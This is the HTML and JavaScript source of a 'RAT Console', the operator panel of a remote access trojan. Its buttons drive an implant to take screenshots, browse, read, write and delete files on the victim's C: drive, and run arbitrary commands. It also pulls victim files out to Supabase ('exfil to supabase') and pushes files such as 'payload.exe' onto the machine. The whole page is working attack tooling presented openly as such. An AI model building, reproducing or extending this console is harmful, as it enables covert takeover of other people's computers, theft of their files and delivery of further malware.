<!doctype html>
<html lang="en">
	<head>
		<meta charset="UTF-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
		<title>RAT Console</title>
		<style>
			* {
				box-sizing: border-box;
				margin: 0;
				padding: 0;
			}
			body {
				font-family: "Segoe UI", system-ui, sans-serif;
				background: #000;
				color: #e0e0e0;
				padding: 24px;
			}
			h1 {
				color: #ffffff;
				margin-bottom: 20px;
				font-size: 1.5rem;
				letter-spacing: 1px;
				text-transform: uppercase;
				border-bottom: 1px solid #333;
				padding-bottom: 12px;
			}
			.grid {
				display: grid;
				grid-template-columns: 1fr 1fr;
				gap: 16px;
			}
			.full {
				grid-column: 1 / -1;
			}
			.card {
				background: #111;
				border: 1px solid #333;
				border-radius: 0;
				padding: 16px;
			}
			.card h2 {
				font-size: 0.85rem;
				color: #ffffff;
				margin-bottom: 10px;
				border-bottom: 1px solid #222;
				padding-bottom: 6px;
				text-transform: uppercase;
				letter-spacing: 0.5px;
				font-weight: 400;
			}
			label {
				display: block;
				font-size: 0.78rem;
				color: #888;
				margin: 8px 0 4px;
				text-transform: uppercase;
				letter-spacing: 0.3px;
			}
			input[type="text"],
			textarea {
				width: 100%;
				background: #0a0a0a;
				border: 1px solid #333;
				border-radius: 0;
				padding: 8px 10px;
				color: #e0e0e0;
				font-size: 0.85rem;
			}
			input[type="text"]:focus,
			textarea:focus {
				outline: none;
				border-color: #666;
			}
			textarea {
				font-family: "Consolas", "Courier New", monospace;
				resize: vertical;
				min-height: 80px;
			}
			button {
				background: #1a1a1a;
				color: #e0e0e0;
				border: 1px solid #444;
				border-radius: 0;
				padding: 6px 16px;
				font-size: 0.8rem;
				cursor: pointer;
				margin-top: 8px;
				transition: 0.1s;
				text-transform: uppercase;
				letter-spacing: 0.5px;
			}
			button:hover {
				background: #333;
				border-color: #888;
				color: #fff;
			}
			.output {
				background: #0a0a0a;
				border: 1px solid #333;
				border-radius: 0;
				padding: 10px;
				margin-top: 10px;
				font-family: "Consolas", "Courier New", monospace;
				font-size: 0.78rem;
				max-height: 300px;
				overflow-y: auto;
				white-space: pre-wrap;
				word-break: break-all;
				color: #ccc;
			}
			.output.success {
				border-color: #888;
			}
			.output.error {
				border-color: #fff;
				color: #fff;
				background: #1a0000;
			}
			img {
				max-width: 100%;
				margin-top: 10px;
				border: 1px solid #333;
				border-radius: 0;
			}
			.row {
				display: flex;
				gap: 8px;
				align-items: end;
			}
			.row > * {
				flex: 1;
			}
			.status-bar {
				display: flex;
				gap: 16px;
				margin-bottom: 16px;
				padding: 8px 0;
				border-bottom: 1px solid #222;
				font-size: 0.75rem;
				color: #666;
				text-transform: uppercase;
				letter-spacing: 0.5px;
			}
			.status-bar span {
				color: #aaa;
			}
			.status-dot {
				display: inline-block;
				width: 8px;
				height: 8px;
				background: #444;
				margin-right: 6px;
			}
			.status-dot.online {
				background: #fff;
			}
			hr {
				border: none;
				border-top: 1px solid #222;
				margin: 12px 0;
			}
		</style>
	</head>
	<body>
		<div class="status-bar">
			<div><span class="status-dot online"></span> connected</div>
			<div>target: <span id="status-target">localhost:6969</span></div>
		</div>

		<h1>☠ remote console</h1>

		<div class="grid">
			<!-- SCREENSHOT -->
			<div class="card full">
				<h2>screenshot</h2>
				<button onclick="takeScreenshot()">capture</button>
				<div id="screenshot-output"></div>
			</div>

			<!-- DIRECTORY LISTING -->
			<div class="card">
				<h2>directory listing</h2>
				<label>path (relative to c:\)</label>
				<div class="row">
					<input
						type="text"
						id="dir-path"
						value=""
						placeholder="Users\user\Desktop"
					/>
					<button onclick="listDir()">list</button>
				</div>
				<div id="dir-output" class="output">—</div>
			</div>

			<!-- READ FILE -->
			<div class="card">
				<h2>read file</h2>
				<label>path (relative to c:\)</label>
				<div class="row">
					<input
						type="text"
						id="read-path"
						value=""
						placeholder="Users\user\Desktop\notes.txt"
					/>
					<button onclick="readFile()">read</button>
				</div>
				<div id="read-output" class="output">—</div>
			</div>

			<!-- CREATE FILE -->
			<div class="card">
				<h2>create file</h2>
				<label>path (relative to c:\)</label>
				<input
					type="text"
					id="create-path"
					value=""
					placeholder="Users\user\Desktop\hello.txt"
				/>
				<label>content</label>
				<textarea
					id="create-content"
					placeholder="file contents..."
				></textarea>
				<button onclick="createFile()">create</button>
				<div id="create-output" class="output">—</div>
			</div>

			<!-- DELETE FILE / FOLDER -->
			<div class="card">
				<h2>delete</h2>
				<label>path (relative to c:\)</label>
				<input
					type="text"
					id="delete-path"
					value=""
					placeholder="Users\user\Desktop\badfile.txt"
				/>
				<div class="row">
					<button onclick="deleteFile()">delete file</button>
					<button onclick="deleteFolder()">delete folder</button>
				</div>
				<div id="delete-output" class="output">—</div>
			</div>

			<!-- DOWNLOAD FILE -->
			<div class="card">
				<h2>download (exfil to supabase)</h2>
				<label>path (relative to c:\)</label>
				<div class="row">
					<input
						type="text"
						id="download-path"
						value=""
						placeholder="Users\user\Desktop\secret.docx"
					/>
					<button onclick="downloadFile()">download</button>
				</div>
				<div id="download-output" class="output">—</div>
			</div>

			<!-- UPLOAD FILE -->
			<div class="card">
				<h2>upload (fetch from supabase)</h2>
				<label>save path (relative to c:\)</label>
				<input
					type="text"
					id="upload-path"
					value=""
					placeholder="Users\user\Desktop\"
				/>
				<label>file name in supabase</label>
				<input
					type="text"
					id="upload-filename"
					value=""
					placeholder="payload.exe"
				/>
				<button onclick="uploadFile()">upload</button>
				<div id="upload-output" class="output">—</div>
			</div>

			<!-- COMMAND EXECUTION -->
			<div class="card full">
				<h2>command execution</h2>
				<label>command</label>
				<input
					type="text"
					id="cmd-cmd"
					value="whoami"
					placeholder="ipconfig"
				/>
				<label>working dir (relative to c:\)</label>
				<input
					type="text"
					id="cmd-path"
					value=""
					placeholder="Users\user\Desktop"
				/>
				<button onclick="runCmd()">execute</button>
				<div id="cmd-output" class="output">—</div>
			</div>
		</div>

		<script>
			const BASE = "http://localhost:6969";

			// ----- UTILITY -----
			async function api(url) {
				const res = await fetch(url);
				if (!res.ok) throw new Error(`HTTP ${res.status}`);
				return res;
			}

			function show(el, content, ok = true) {
				const div = document.getElementById(el);
				div.textContent = content;
				div.className = "output " + (ok ? "success" : "error");
			}

			// ----- SCREENSHOT -----
			async function takeScreenshot() {
				const out = document.getElementById("screenshot-output");
				try {
					const res = await api(`${BASE}/screenshot`);
					const blob = await res.blob();
					const url = URL.createObjectURL(blob);
					out.innerHTML = `<img src="${url}" alt="screenshot" />`;
				} catch (e) {
					out.innerHTML = `<div class="output error">${e.message}</div>`;
				}
			}

			// ----- DIRECTORY LISTING -----
			async function listDir() {
				const path = document.getElementById("dir-path").value;
				try {
					const res = await api(
						`${BASE}/getdir?path=${encodeURIComponent(path)}`,
					);
					const data = await res.json();
					show(
						"dir-output",
						Array.isArray(data) ? data.join("\n") : data,
						true,
					);
				} catch (e) {
					show("dir-output", e.message, false);
				}
			}

			// ----- READ FILE -----
			async function readFile() {
				const path = document.getElementById("read-path").value;
				try {
					const res = await api(
						`${BASE}/readfile?path=${encodeURIComponent(path)}`,
					);
					const text = await res.text();
					const formatted = text
						.replace(/&/g, "&amp;")
						.replace(/</g, "&lt;")
						.replace(/>/g, "&gt;")
						.replace(/\r\n/g, "\n")
						.replace(/\n/g, "<br>")
						.replace(/\t/g, "&nbsp;&nbsp;&nbsp;&nbsp;");
					const div = document.getElementById("read-output");
					div.innerHTML = formatted;
					div.className = "output success";
				} catch (e) {
					show("read-output", e.message, false);
				}
			}

			// ----- CREATE FILE -----
			async function createFile() {
				const path = document.getElementById("create-path").value;
				const content = document.getElementById("create-content").value;
				try {
					const res = await api(
						`${BASE}/createfile?path=${encodeURIComponent(path)}&content=${encodeURIComponent(content)}`,
					);
					const text = await res.text();
					show("create-output", "created / written: " + text, true);
				} catch (e) {
					show("create-output", e.message, false);
				}
			}

			// ----- DELETE FILE -----
			async function deleteFile() {
				const path = document.getElementById("delete-path").value;
				try {
					const res = await api(
						`${BASE}/removefile?path=${encodeURIComponent(path)}`,
					);
					const text = await res.text();
					show("delete-output", text, true);
				} catch (e) {
					show("delete-output", e.message, false);
				}
			}

			// ----- DELETE FOLDER -----
			async function deleteFolder() {
				const path = document.getElementById("delete-path").value;
				try {
					const res = await api(
						`${BASE}/removefolder?path=${encodeURIComponent(path)}`,
					);
					const text = await res.text();
					show("delete-output", text, true);
				} catch (e) {
					show("delete-output", e.message, false);
				}
			}

			// ----- DOWNLOAD (EXFIL TO SUPABASE) -----
			async function downloadFile() {
				const path = document.getElementById("download-path").value;
				try {
					const res = await api(
						`${BASE}/downloadfile?path=${encodeURIComponent(path)}`,
					);
					const text = await res.text();
					// If Supabase returns a URL, show it
					if (text.startsWith("http")) {
						show("download-output", "public url: " + text, true);
					} else {
						show("download-output", text, false);
					}
				} catch (e) {
					show("download-output", e.message, false);
				}
			}

			// ----- UPLOAD (FETCH FROM SUPABASE) -----
			async function uploadFile() {
				const dwpath = document.getElementById("upload-path").value;
				const dbfilename =
					document.getElementById("upload-filename").value;
				try {
					const res = await api(
						`${BASE}/uploadfile?dwpath=${encodeURIComponent(dwpath)}&dbfilename=${encodeURIComponent(dbfilename)}`,
					);
					const text = await res.text();
					show("upload-output", text, true);
				} catch (e) {
					show("upload-output", e.message, false);
				}
			}

			// ----- CMD -----
			async function runCmd() {
				const cmd = document.getElementById("cmd-cmd").value;
				const path = document.getElementById("cmd-path").value;
				try {
					const res = await api(
						`${BASE}/cmd?cmd=${encodeURIComponent(cmd)}&path=${encodeURIComponent(path)}`,
					);
					const data = await res.json();
					let out = "";
					if (data.stdout) out += data.stdout;
					if (data.stderr) out += "\n[stderr]\n" + data.stderr;
					out += `\n[exit code: ${data.code}]`;
					show("cmd-output", out, data.code === 0);
				} catch (e) {
					show("cmd-output", e.message, false);
				}
			}
		</script>
	</body>
</html>
